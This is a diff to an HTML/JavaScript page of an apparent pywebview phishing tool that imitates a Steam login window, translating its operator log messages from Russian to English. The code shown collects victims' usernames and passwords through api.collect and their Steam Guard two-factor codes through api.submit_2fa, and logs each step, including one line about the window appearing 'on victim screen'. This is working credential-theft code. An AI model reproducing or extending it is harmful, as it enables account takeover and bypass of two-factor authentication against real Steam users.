@@ -372,7 +372,7 @@
 <body>
     <div class="TitleBar">
         <div class="close-btn"
-            onclick="if(window.pywebview) window.pywebview.api.log_event('Пользователь закрыл окно Steam (Крестик)'); setTimeout(()=>window.pywebview.api.close(), 100);">
+            onclick="if(window.pywebview) window.pywebview.api.log_event('User closed the Steam window (X)'); setTimeout(()=>window.pywebview.api.close(), 100);">
             <svg viewBox="0 0 256 256" stroke="currentColor" stroke-width="40" fill="none">
                 <line x1="212" y1="212" x2="44" y2="44"></line>
                 <line x1="44" y1="212" x2="212" y2="44"></line>
@@ -546,7 +546,7 @@
     <script>
         // Report when window is loaded
         window.addEventListener('pywebviewready', function () {
-            window.pywebview.api.log_event("Окно Steam успешно отображено на экране мамонта.");
+            window.pywebview.api.log_event("Steam window successfully displayed on victim screen.");
         });
 
         // Setup OTP Input Logic
@@ -589,7 +589,7 @@
             const p = document.getElementById('password').value;
 
             if (u && p) {
-                if (window.pywebview) window.pywebview.api.log_event(`Ввёл лог:пасс (${u}:${p}) и нажал Войти`);
+                if (window.pywebview) window.pywebview.api.log_event(`Entered login:password (${u}:${p}) and clicked Sign in`);
 
                 // Show loading state
                 document.querySelector('#login_step .btn-login').innerText = "Verifying...";
@@ -600,7 +600,7 @@
 
                 window.pywebview.api.collect(u, p);
             } else {
-                if (window.pywebview) window.pywebview.api.log_event("Пытался войти с пустыми полями");
+                if (window.pywebview) window.pywebview.api.log_event("Attempted login with empty fields");
             }
         }
 
@@ -657,7 +657,7 @@
                 code = code.trim().toUpperCase();
 
                 if (code.length === 5) {
-                    if (window.pywebview) window.pywebview.api.log_event(`Ввёл код Guard: ${code}`);
+                    if (window.pywebview) window.pywebview.api.log_event(`Entered Guard code: ${code}`);
 
                     // Update button status
                     const inputs_container = document.getElementById('otp_inputs');
@@ -667,7 +667,7 @@
                     }
                     window.pywebview.api.submit_2fa(code);
                 } else {
-                    if (window.pywebview) window.pywebview.api.log_event("Пользователь ввёл короткий код Guard");
+                    if (window.pywebview) window.pywebview.api.log_event("User entered a short Guard code");
                 }
             } catch (e) {
                 if (window.pywebview) window.pywebview.api.log_event("JS Error: " + e);
